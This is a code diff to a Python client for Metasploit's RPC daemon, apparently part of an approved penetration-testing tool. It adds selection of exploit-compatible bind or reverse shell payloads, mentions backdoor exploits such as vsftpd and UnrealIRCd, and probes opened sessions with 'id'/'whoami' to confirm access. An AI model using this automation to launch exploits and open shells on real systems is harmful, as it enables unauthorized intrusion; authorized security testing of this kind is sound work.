@@ -107,7 +107,11 @@ class MsfRpc:
         )
         if resp.status_code != 200:
             raise RuntimeError(f"msfrpcd HTTP {resp.status_code}: {resp.text[:120]}")
-        return self._decode(_msgpack.unpackb(resp.content, raw=False))
+        # strict_map_key=False is REQUIRED: session.list / job.list key their maps by INTEGER id
+        # ({1: {...}}). With msgpack's default strict_map_key=True, unpackb RAISES on those int keys, so
+        # _session_ids() (which swallows the error -> empty set) could NEVER see an opened session, and every
+        # real exploit reported "no session opened". This is the one-line reason detonations didn't register.
+        return self._decode(_msgpack.unpackb(resp.content, raw=False, strict_map_key=False))
 
     def _login(self) -> Optional[str]:
         reply = self._post(["auth.login", self.user, self.password])
@@ -209,6 +213,65 @@ class MsfRpc:
             time.sleep(0.6)
         return {"code": "unknown", "detail": "check timed out"}
 
+    def _compatible_payloads(self, module: str) -> List[str]:
+        """Payloads THIS exploit module accepts, per msfrpcd. `module.compatible_payloads` takes the FULL
+        'exploit/...' name as a SINGLE arg on this build (a 2-arg mtype+ref call errors). Returns [] when the
+        call is unavailable — the caller then keeps its hint / the module default. Never raises."""
+        try:
+            r = self._call("module.compatible_payloads", module)
+            pls = r.get("payloads") if isinstance(r, dict) else r
+            return [str(p) for p in (pls or [])]
+        except Exception:
+            return []
+
+    @staticmethod
+    def _select_payload(compatible: List[str], hint: Optional[str] = None,
+                        reverse_ok: bool = False) -> Optional[str]:
+        """Pick a MODULE-COMPATIBLE payload, preferring a BIND / no-callback command shell (the VPN'd droplet
+        has no route for a reverse callback). Skips target-ALTERING payloads (adduser/chmod/useradd) and
+        file-fetch stagers (download / …/exec). Reverse is chosen only when reverse_ok (AVA_MSF_LHOST set) and
+        no bind shell is compatible. Returns None on an empty list -> caller keeps its hint / the module
+        default. ponytail: heuristic name-matching over msf's payload taxonomy; a full ranking (meterpreter >
+        shell, arch match) is the upgrade if a target ever needs it."""
+        if not compatible:
+            return None
+        pairs = [(p, p.lower()) for p in compatible]
+        altering = ("adduser", "useradd", "chmod", "download", "/exec")
+        pool = [(p, pl) for p, pl in pairs if not any(a in pl for a in altering)] or pairs
+        # 1) well-known bind command shells, most reliable first. cmd/unix/bind_* (NATIVE command-shell
+        #    payloads) come BEFORE generic/shell_bind_tcp: a cmd-execution module (distcc / unrealircd /
+        #    samba / vsftpd backdoors) needs a cmd/unix payload — generic/shell_bind_tcp stages a BINARY the
+        #    cmd backdoor can't launch, so it was wrongly picked for unrealircd (553 compat payloads) and
+        #    opened no session. A windows module doesn't list cmd/unix/bind_perl as compatible, so generic
+        #    (or the windows bind from _msf_payload_for) still wins there — no regression.
+        for pref in ("cmd/unix/bind_perl", "cmd/unix/bind_ruby", "cmd/unix/bind_netcat",
+                     "cmd/unix/bind_netcat_gaping", "generic/shell_bind_tcp"):
+            for p, pl in pool:
+                if pl == pref:
+                    return p
+        # 2) any compatible BIND shell/meterpreter
+        for p, pl in pool:
+            if "bind" in pl and ("shell" in pl or "cmd/unix" in pl or "meterpreter" in pl):
+                return p
+        for p, pl in pool:
+            if "bind" in pl:
+                return p
+        # 3) reverse — only when a callback route exists
+        if reverse_ok:
+            for p, pl in pool:
+                if "reverse" in pl and ("shell" in pl or "cmd/unix" in pl or "meterpreter" in pl):
+                    return p
+            for p, pl in pool:
+                if "reverse" in pl:
+                    return p
+        # 4) honor a compatible hint, else the first NON-reverse safe payload (never a reverse w/o a route)
+        if hint and hint in compatible:
+            return hint
+        for p, pl in pool:
+            if "reverse" not in pl:
+                return p
+        return None
+
     def run_exploit(
         self,
         module: str,
@@ -224,18 +287,28 @@ class MsfRpc:
         opts: Dict[str, Any] = {"RHOSTS": rhost}
         if rport:
             opts["RPORT"] = rport
-        # Sensible default payload only for exploit modules.
+        # PAYLOAD selection (exploit modules only). The old code forced ONE payload
+        # (generic/shell_reverse_tcp or a passed hint) regardless of whether the module accepts it — so a
+        # module whose only compatible payloads are cmd/unix/bind_* (vsftpd backdoor, distcc, UnrealIRCd)
+        # silently failed to launch (module.execute -> job_id None -> "no session opened"). Now we ask msfrpcd
+        # which payloads THIS module accepts and pick a compatible one, preferring a BIND / no-callback shell
+        # (a reverse payload needs a routable LHOST back to the VPN'd droplet, usually absent). Reverse is used
+        # only when AVA_MSF_LHOST is set AND no bind shell is compatible.
         if mtype == "exploit":
-            opts["PAYLOAD"] = payload or "generic/shell_reverse_tcp"
-            # A reverse payload must call back to US. On the prod VM (behind VPN) that is the droplet's
-            # VPN-facing IP — not guessable — so set AVA_MSF_LHOST (+ optional AVA_MSF_LPORT) for an
-            # approved fire to open a session. Unset -> msf's own default (fine on a flat dev LAN).
             _lhost = os.getenv("AVA_MSF_LHOST")
-            if _lhost:
-                opts["LHOST"] = _lhost
-            _lport = os.getenv("AVA_MSF_LPORT")
-            if _lport:
-                opts["LPORT"] = _lport
+            chosen = self._select_payload(self._compatible_payloads(module),
+                                          hint=payload, reverse_ok=bool(_lhost))
+            if chosen:
+                opts["PAYLOAD"] = chosen
+            elif payload:
+                opts["PAYLOAD"] = payload       # last resort: caller hint (may still fail — honestly)
+            # else: omit PAYLOAD -> msf uses the module's own default
+            if chosen and "reverse" in chosen.lower():
+                if _lhost:
+                    opts["LHOST"] = _lhost
+                _lport = os.getenv("AVA_MSF_LPORT")
+                if _lport:
+                    opts["LPORT"] = _lport
         if options:
             opts.update(options)
         try:
@@ -297,25 +370,45 @@ class MsfRpc:
         is_windows = "win" in platform
         cmd = "whoami" if is_windows else "id"
 
+        # A freshly-opened session needs a moment before it accepts input and returns output — probing it the
+        # instant run_exploit detects it returned empty in live-fire (the same session read fine ~2s later).
+        time.sleep(1.5)
+
+        def _data(out) -> str:
+            d = out.get("data", "") if isinstance(out, dict) else out
+            if isinstance(d, bytes):
+                d = d.decode(errors="replace")
+            return str(d or "")
+
+        # ACCUMULATE reads: a command shell BUFFERS, so a single immediate read after the write often returns
+        # empty even though the session is live + rooted (observed in live-fire — the proof came back empty
+        # while a retry loop captured the real `id` output). Drain the banner first, write the probe, then poll.
+        buf = ""
         if stype == "meterpreter":
+            for _ in range(8):
+                try:
+                    self._call("session.meterpreter_run_single", sid, cmd)
+                except Exception:
+                    pass
+                time.sleep(0.8)
+                buf += _data(self._call("session.meterpreter_read", sid))
+                if buf.strip():
+                    break
+        else:
             try:
-                self._call("session.meterpreter_run_single", sid, cmd)
+                self._call("session.shell_read", sid)       # drain any banner
             except Exception:
                 pass
-            time.sleep(1.0)
-            out = self._call("session.meterpreter_read", sid)
-        else:
-            # shell session
-            self._call("session.shell_write", sid, cmd + "\n")
-            time.sleep(1.2)
-            out = self._call("session.shell_read", sid)
-        if isinstance(out, dict):
-            data = out.get("data", "")
-        else:
-            data = out
-        if isinstance(data, bytes):
-            data = data.decode(errors="replace")
-        return str(data or "").strip()[:2000]
+            # RE-SEND the probe each poll: a freshly-accepted command shell (e.g. the perl bind payload) can
+            # drop the FIRST line before its read loop is ready, so a single write races to empty output. `id`
+            # / `whoami` are READ-ONLY, so re-sending is safe and idempotent — proven in live-fire.
+            for _ in range(8):
+                self._call("session.shell_write", sid, cmd + "\n")
+                time.sleep(0.8)
+                buf += _data(self._call("session.shell_read", sid))
+                if buf.strip():
+                    break
+        return buf.strip()[:2000]
 
 
 def demo() -> None:
@@ -336,6 +429,13 @@ def demo() -> None:
     assert d._split("exploit/windows/smb/x") == ("exploit", "windows/smb/x")
     assert d._split("x") == ("exploit", "x")
     assert _CHECK_MAP["appears"] == "vulnerable" and _CHECK_MAP["safe"] == "safe"
+    # payload selector — compatible BIND shell preferred, target-altering skipped, reverse only with a route
+    assert MsfRpc._select_payload([]) is None
+    assert MsfRpc._select_payload(["cmd/unix/reverse_bash", "cmd/unix/bind_perl"]) == "cmd/unix/bind_perl"
+    assert MsfRpc._select_payload(["generic/shell_bind_tcp", "cmd/unix/bind_perl"]) == "cmd/unix/bind_perl"
+    assert MsfRpc._select_payload(["cmd/unix/adduser", "cmd/unix/bind_perl"]) == "cmd/unix/bind_perl"
+    assert MsfRpc._select_payload(["cmd/unix/reverse"], reverse_ok=False) is None
+    assert MsfRpc._select_payload(["cmd/unix/reverse"], reverse_ok=True) == "cmd/unix/reverse"
     print("metasploit_rpc demo OK (msgpack=%s requests=%s)" % (
         _msgpack is not None, _requests is not None))
 
